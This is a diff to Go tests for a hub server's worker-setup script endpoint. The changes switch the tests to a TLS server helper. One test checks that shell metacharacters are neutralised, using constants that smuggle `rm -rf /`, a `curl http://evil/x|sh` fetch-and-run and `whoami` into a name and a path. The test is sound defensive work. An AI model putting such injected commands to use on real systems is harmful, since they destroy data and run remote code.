@@ -18,11 +18,11 @@ import (
 // catch the shape error that stays syntactically valid.
 func TestGeneratedPOSIXScriptIsRunnableNotJustSafe(t *testing.T) {
 	service := throttleTestService(t, "worker-script-shape.db")
-	handler := NewServer("", service).Handler()
+	handler := workerSetupTLSServer(t, service, map[string]string{"linux-amd64": "binary-content"})
 
 	body := `{"platform":"linux-amd64","name":"studio-linux","pairing_token":"pair-abc123","mounts":[{"root_id":"root-1","path":"/mnt/nas/footage"}],"cache_dir":"/var/cache/timingdex"}`
 	response := httptest.NewRecorder()
-	handler.ServeHTTP(response, hubAdminRequest(service, http.MethodPost, "/api/v1/hub/worker-setup/script", strings.NewReader(body)))
+	handler.ServeHTTP(response, tlsAdminRequest(service, http.MethodPost, "/api/v1/hub/worker-setup/script", strings.NewReader(body)))
 	if response.Code != http.StatusOK {
 		t.Fatalf("status=%d body=%s", response.Code, response.Body.String())
 	}
@@ -52,7 +52,7 @@ func TestGeneratedPOSIXScriptIsRunnableNotJustSafe(t *testing.T) {
 // reach, and the script must still parse afterwards.
 func TestGeneratedScriptsNeutraliseShellMetacharacters(t *testing.T) {
 	service := throttleTestService(t, "worker-script-injection.db")
-	handler := NewServer("", service).Handler()
+	handler := workerSetupTLSServer(t, service, map[string]string{"linux-amd64": "binary-content", "windows-amd64": "binary-content"})
 
 	const evilName = `it's ; rm -rf / #`
 	const evilPath = `/mnt/$(curl http://evil/x|sh)/` + "`whoami`"
@@ -62,7 +62,7 @@ func TestGeneratedScriptsNeutraliseShellMetacharacters(t *testing.T) {
 	for _, platform := range []string{"linux-amd64", "windows-amd64"} {
 		response := httptest.NewRecorder()
 		payload := strings.Replace(body, "PLATFORM", platform, 1)
-		handler.ServeHTTP(response, hubAdminRequest(service, http.MethodPost, "/api/v1/hub/worker-setup/script", strings.NewReader(payload)))
+		handler.ServeHTTP(response, tlsAdminRequest(service, http.MethodPost, "/api/v1/hub/worker-setup/script", strings.NewReader(payload)))
 		if response.Code != http.StatusOK {
 			t.Fatalf("%s: status=%d body=%s", platform, response.Code, response.Body.String())
 		}
